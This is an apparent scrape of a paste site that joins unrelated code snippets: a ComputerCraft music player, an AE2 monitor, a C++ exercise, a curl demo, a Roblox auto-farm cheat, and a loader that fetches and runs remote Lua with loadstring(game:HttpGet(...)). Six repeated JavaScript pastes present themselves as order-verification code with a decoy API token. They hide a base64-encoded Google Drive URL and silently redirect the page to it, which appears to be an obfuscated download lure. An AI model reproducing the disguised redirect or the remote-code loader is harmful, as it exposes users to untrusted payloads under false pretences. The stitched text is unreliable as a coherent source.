            for i, song in ipairs(search_results) do 
                ui.box(scroller, 1, y, width-6, 5, colors.brown)
                ui.label(scroller, 2, y+1, truncateString(song.name, titleTruncateLimit), colors.white, colors.brown)
                ui.label(scroller, 2, y+2, truncateString(song.artist, artistTruncateLimit), colors.lightGray, colors.brown)
                if isSmallScreen then y = y + 1 end
                ui.button(scroller, width-21, y+2, ""Play"", ""play.""..i, colors.white, colors.magenta, colors.purple)
                local songInQueue = false
                for _, queuedSong in ipairs(queue) do
                    if queuedSong.id == song.id then
                        songInQueue = true
                        break
                    end
                end
                if songInQueue then
                    ui.button(scroller, width-14, y+2, ""Remove"", ""rem.""..i, colors.white, colors.red, colors.orange)
                else
                    ui.button(scroller, width-14, y+2, ""Add"", ""add.""..i, colors.white, colors.gray, colors.lightGray)
                end
                y = y + 6
            end
        end

        ui.inputBox(term.current(), 4, 7, width-7, ""search"", colors.white, colors.gray)
    end

    
    local object, callback, text = ui.run()
    term.clear()
    term.setCursorPos(1, 1)
    if object == ""button"" then
        if callback == ""page.2"" then
            ui.page = 2
        elseif callback == ""page.1"" then
            ui.page = 1
        elseif callback:sub(1, 4) == ""play"" then
            local index = tonumber(callback:sub(6))
            if index and search_results[index] then
                playSong(search_results[index])
                ui.page = 1
            end
        elseif callback:sub(1, 3) == ""add"" then
            local index = tonumber(callback:sub(5))
            if index and search_results[index] then
                addToQueue(search_results[index])
            end
        elseif callback:sub(1, 4) == ""rem"" then
            local index = tonumber(callback:sub(6))
            if index and search_results[index] then
                removeFromQueue(index)
            end
        elseif callback == ""pause"" then
            stopPlayback()
        elseif callback == ""resume"" then
            playing = true
        elseif callback == ""loop"" then
            toggleLoop()
        elseif callback == ""skip"" then
            skipSong()
        elseif callback == ""clear.q"" then
            clearQueue()
        elseif callback == ""clear"" then
            playing = false
            now_playing = nil
            playing_id = nil
        end
    elseif object == ""keyAction"" then
        if callback == ""page.2"" then
            ui.page = 2
        elseif callback == ""page.1"" then
            ui.page = 1
        end
    elseif object == ""inputBox"" and callback == ""search"" then
        if text ~= """" then
            searchMusic(text)
            term.clear()
            local sx, sy = term.getSize()
            term.setTextColor(colors.lightGray)
            term.setCursorPos(sx/2 - #""Fetching...""/2, sy/2)
            term.write(""Fetching..."")
            ui.searchDone = false
            repeat
                sleep(0.1)
            until ui.searchDone == true
            ui.searchDone = false
        end
    elseif object == ""rerender"" then
        print(""rerender"")
    else
        term.clear()
        term.setCursorPos(1, 1)
        error(""[""..(object or ""No object"")..""] ""..(callback or ""No callback"").."" ""..(text or ""No text"").."" not handled! Exiting"",0)
    end
end

local function mainLoop()

    while true do
        -- AUDIO
        sleep(0.1)
        if playing and now_playing then
            if playing_id ~= now_playing.id then
                playing_id = now_playing.id
                last_download_url = api_base_url .. ""?v=2&id="" .. textutils.urlEncode(playing_id)
                playing_status = 0
                needs_next_chunk = 1

                http.request({url = last_download_url, binary = true})
				is_loading = true

            end
            if playing_status == 1 and needs_next_chunk == 3 then
                needs_next_chunk = 1
                for _, speaker in ipairs(speakers) do
                    while not speaker.playAudio(buffer) do
                        needs_next_chunk = 2
                        break
                    end
                end
            end
            if playing_status == 1 and needs_next_chunk == 1 then

                while true do
                    local chunk = player_handle.read(size)
                    if not chunk then
                        if looping then
                            playing_id = nil
                        else
                            if #queue > 0 then
                                now_playing = queue[1]
                                table.remove(queue, 1)
                                playing_id = nil
                            else
                                now_playing = nil
                                playing = false
                                playing_id = nil
                                is_loading = false
                                is_error = false
                            end
                        end


                        player_handle.close()
                        needs_next_chunk = 0
                        break
                    else
                        if start then
                            chunk, start = start .. chunk, nil
                            size = size + 4
                        end
                
                        buffer = decoder(chunk)
                        for _, speaker in ipairs(speakers) do
                            while not speaker.playAudio(buffer) do
                                needs_next_chunk = 2
                                break
                            end
                        end
                        if needs_next_chunk == 2 then
                            break
                        end
                    end
                end

            end
        end
    end
end
initCustomPallete()
parallel.waitForAny(mainLoop, function()
    while true do 
        local event, param1, param2, param3, param4 = os.pullEvent()

        if event == ""timer"" then
            os.startTimer(1)
        end

        if event == ""speaker_audio_empty"" then
            if needs_next_chunk == 2 then
                needs_next_chunk = 3
            end
        end

        if event == ""http_success"" then
            local url = param1
            local handle = param2
            if url == last_search_url then
                search_results = textutils.unserialiseJSON(handle.readAll())
                table.remove(search_results, 1)
                ui.searchDone = true
                -- term.clear()
                -- term.setCursorPos(1, 1)
                -- error(textutils.serialise(search_results),0)
            end
            if url == last_download_url then
                player_handle = handle
                start = handle.read(4)
                size = 16 * 1024 - 4
                if start == ""RIFF"" then
                    error(""WAV not supported!"")
                end
                playing_status = 1
                decoder = require ""cc.audio.dfpwm"".make_decoder()
            end
        end

        if event == ""http_failure"" then
            local url = param1

            if url == last_search_url then
                search_error = true
                ui.searchDone = true
            end
            if url == last_download_url then
                if #queue > 0 then
                    now_playing = queue[1]
                    table.remove(queue, 1)
                    playing_id = nil
                else
                    now_playing = nil
                    playing = false
                    playing_id = nil
                end
            end
        end
    end 
end, function() while true do redrawScreen() end end)
"
WFBHMYkw,Tio's HUB (Blox Fruits),YTBB,Lua,Sunday 30th of March 2025 12:53:09 PM CDT,"local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild(""Humanoid"")
local hrp = character:WaitForChild(""HumanoidRootPart"")
local vu = game:GetService(""VirtualUser"")
local runService = game:GetService(""RunService"")

-- Function to find the closest enemy
function getClosestNPC()
    local closestNPC = nil
    local shortestDistance = math.huge

    for _, npc in pairs(workspace.Enemies:GetChildren()) do
        if npc:FindFirstChild(""HumanoidRootPart"") and npc:FindFirstChild(""Humanoid"") and npc.Humanoid.Health > 0 then
            local distance = (hrp.Position - npc.HumanoidRootPart.Position).Magnitude
            if distance < shortestDistance then
                shortestDistance = distance
                closestNPC = npc
            end
        end
    end
    return closestNPC
end

-- Auto-click function (simulates clicking every 10ms)
spawn(function()
    while true do
        vu:Button1Down(Vector2.new(0, 0))  -- Simulates a click
        task.wait(0.01)  -- 10ms delay
    end
end)

-- Auto movement loop (runs every frame for smooth movement)
runService.RenderStepped:Connect(function()
    local target = getClosestNPC()
    
    if target and humanoid then
        humanoid:MoveTo(target.HumanoidRootPart.Position) -- Move towards the enemy
    end
end)
"
gRv5pH92,Whesky Hub,MemoHookz,Lua,Sunday 30th of March 2025 12:47:31 PM CDT,"loadstring(game:HttpGet(('https://raw.githubusercontent.com/WeshkyPL/WehskyHub/refs/heads/main/WeshkyHubV1.12.lua'),true))()

-- [Whesky Hub]"
5PRuUecC,Market.js,luqlegal,JavaScript,Sunday 30th of March 2025 12:46:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/001/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
scJG3fRC,Set cURL default Config User Agent,metalx1000,Bash,Sunday 30th of March 2025 12:38:06 PM CDT,"# set test server
nc -nlvp 8888

curl ""localhost:8888""

curl ""localhost:8888"" -A ""Hello World""

curl ""localhost:8888"" -A ""Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13""

vim ~/.curlrc
-A ""Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13""
"
ajepq4PE,Untitled,Josif_tepe,C++,Sunday 30th of March 2025 12:24:40 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
#include <map>
using namespace std;
typedef long long ll;

int main() {
    ios_base::sync_with_stdio(false);
    ll k, x;
    cin >> k >> x;
    
    ll res = 1e18;
    if(x % k == 0) {
        res = x / k;
    }
    
    ll power = 1;
    for(int i = 0; i < 100; i++) {
        ll tmp = power * k;
        
        if(tmp <= x) {
            if(x % tmp == 0) {
                ll n = x / tmp;
                if(n * power * k == x) {
                    res = min(res, n + i);
                }
            }
        }
        else {
            break;
        }
        power *= k;
    }
    
    if(res == 1e18) {
        res = -1;
    }
    cout << res << endl;
    
    
    return 0;
    
}
"
nR2Dp4QF,Order.js,luqlegal,JavaScript,Sunday 30th of March 2025 12:00:35 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/290/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nxuzDMw3,Market.js,luqlegal,JavaScript,Sunday 30th of March 2025 11:45:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/498/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vrf23X2f,Products.js,luqlegal,JavaScript,Sunday 30th of March 2025 11:14:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/229/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2714kp1P,Untitled,alexnolan,Lua,Sunday 30th of March 2025 10:36:26 AM CDT,"-- AE2 Crafting Monitor - Portable Floppy Version with Auto-Detection
-- Configuration
local REFRESH_RATE = 2  -- Update every 2 seconds
local SAVE_CONFIG = true  -- Save configuration to disk

-- Global variables
local bridge = nil
local monitor = nil

-- Try to load saved configuration if available
local configPath = ""/disk/ae2monitor.cfg""
if fs.exists(configPath) then
    local file = fs.open(configPath, ""r"")
    if file then
        local config = textutils.unserialize(file.readAll())
        file.close()
        if config then
            REFRESH_RATE = config.refresh or REFRESH_RATE
        end
    end
end

-- Save current configuration
function saveConfig()
    if SAVE_CONFIG then
        local config = {
            refresh = REFRESH_RATE
        }
        local file = fs.open(configPath, ""w"")
        if file then
            file.write(textutils.serialize(config))
            file.close()
            return true
        end
    end
    return false
end

-- Auto-detect peripherals
function findPeripherals()
    local foundBridge = false
    local foundMonitor = false
    
    print(""Searching for peripherals..."")
    
    -- Get all peripherals
    local peripherals = peripheral.getNames()
    
    -- Debug: show all peripherals
    print(""Available peripherals:"")
    for _, name in ipairs(peripherals) do
        print(""- "" .. name .. "" ("" .. peripheral.getType(name) .. "")"")
    end
    
    -- First look for ME Bridge
    for _, name in ipairs(peripherals) do
        local type = peripheral.getType(name)
        -- Check for various possible ME bridge types
        if type == ""meBridge"" or type == ""me_bridge"" or 
           type:find(""ae2"") or type:find(""appliedenergistics"") then
            print(""Found ME Bridge: "" .. name)
            bridge = peripheral.wrap(name)
            foundBridge = true
            break
        end
    end
    
    -- Then look for a monitor
    for _, name in ipairs(peripherals) do
        if peripheral.getType(name) == ""monitor"" then
            print(""Found monitor: "" .. name)
            monitor = peripheral.wrap(name)
            monitor.setTextScale(1)
            monitor.clear()
            foundMonitor = true
            break
        end
    end
    
    return foundBridge, foundMonitor
end

-- Initialize system
function init()
    -- Connect to peripherals
    print(""Initializing AE2 Crafting Monitor..."")
    
    -- Auto-detect peripherals
    local foundBridge, foundMonitor = findPeripherals()
    
    if not foundBridge then
        error(""ME Bridge not found! Please connect an ME Bridge peripheral."")
    end
    
    if not foundMonitor then
        print(""Warning: Monitor not found, using terminal output"")
    end
    
    -- Save configuration for next time
    saveConfig()
    
    print(""Initialization complete!"")
end

-- Get all ongoing crafting tasks
function getCraftingTasks()
    local tasks = bridge.getCraftingTasks()
    return tasks
end

-- Format crafting progress nicely
function formatProgress(progress)
    return string.format(""%.1f%%"", progress * 100)
end

-- Get nicely formatted time remaining
function formatTimeRemaining(task)
    if not task.rate or task.rate == 0 then
        return ""Unknown""
    end
    
    local itemsLeft = task.total - task.done
    local secondsLeft = itemsLeft / task.rate
    
    if secondsLeft < 60 then
        return string.format(""%.0f sec"", secondsLeft)
    elseif secondsLeft < 3600 then
        return string.format(""%.1f min"", secondsLeft / 60)
    else
        return string.format(""%.1f hrs"", secondsLeft / 3600)
    end
end

-- Display output to terminal or monitor
function write(x, y, text, color)
    if monitor then
        if color then monitor.setTextColor(color) end
        monitor.setCursorPos(x, y)
        monitor.write(text)
    else
        term.setCursorPos(x, y)
        if color then term.setTextColor(color) end
        term.write(text)
    end
end

-- Clear screen (monitor or terminal)
function clearScreen()
    if monitor then
        monitor.clear()
    else
        term.clear()
    end
end

-- Show crafting tasks on screen
function displayTasks(tasks)
    clearScreen()
    
    -- Display header
    write(1, 1, ""=== AE2 Crafting Monitor ==="", colors.yellow)
    write(1, 3, ""Task Name"", colors.cyan)
    write(24, 3, ""Progress"", colors.cyan)
    write(34, 3, ""Rate"", colors.cyan)
    write(42, 3, ""Remaining"", colors.cyan)
    
    if #tasks == 0 then
        write(1, 5, ""No crafting tasks in progress"", colors.lightGray)
    else
        local y = 5
        for i, task in ipairs(tasks) do
            local taskName = task.name or ""Unknown Item""
            if #taskName > 20 then
                taskName = string.sub(taskName, 1, 17) .. ""...""
            end
            
            -- Calculate progress and rate
            local progress = task.done / task.total
            local rateText = ""N/A""
            if task.rate then
                rateText = string.format(""%.1f/s"", task.rate)
            end
            
            -- Display task info
            local color = colors.white
            if progress < 0.25 then
                color = colors.red
            elseif progress < 0.75 then
                color = colors.yellow
            else
                color = colors.green
            end
            
            write(1, y, taskName, colors.white)
            write(24, y, formatProgress(progress), color)
            write(34, y, rateText, colors.white)
            write(42, y, formatTimeRemaining(task), colors.white)
            
            y = y + 1
        end
    end
    
    -- Display footer with last update time
    local timeText = ""Last updated: "" .. textutils.formatTime(os.time(), true)
    if monitor then
        local width, height = monitor.getSize()
        write(width - #timeText - 1, height, timeText, colors.lightGray)
    else
        write(51 - #timeText, 19, timeText, colors.lightGray)
    end
end

-- Main monitoring function
function monitorCrafting()
    -- First, let's print all available methods to the terminal
    print(""All available methods on ME Bridge:"")
    for method, _ in pairs(bridge) do
        print(""- "" .. method)
    end
    
    while true do
        clearScreen()
        
        -- Try different possible method names
        local tasks = nil
        local errorMsg = ""Unknown error""
        
        -- Try potential method names
        for _, methodName in ipairs({""getCraftingTasks"", ""getCraftingCPUs"", ""listCraftingTasks"", ""getCraftingStatus""}) do
            if bridge[methodName] then
                local ok, result = pcall(bridge[methodName])
                if ok then
                    write(1, 1, ""Using method: "" .. methodName, colors.green)
                    tasks = result
                    break
                else
                    errorMsg = ""Method "" .. methodName .. "" failed: "" .. tostring(result)
                end
            end
        end
        
        if tasks then
            displayTasks(tasks)
        else
            write(1, 1, ""Error retrieving crafting tasks:"", colors.red)
            write(1, 2, errorMsg, colors.red)
            write(1, 4, ""Please provide the specific error above when asking for help"", colors.yellow)
        end
        
        sleep(REFRESH_RATE)
    end
end

-- Main program function
function run()
    init()
    monitorCrafting()
end

-- Start the program
run()
"
azP1QCXh,Untitled,luqlegal,JavaScript,Sunday 30th of March 2025 10:28:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/800/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CySq6gWm,Products.js,luqlegal,JavaScript,Sunday 30th of March 2025 10:12:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/543/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
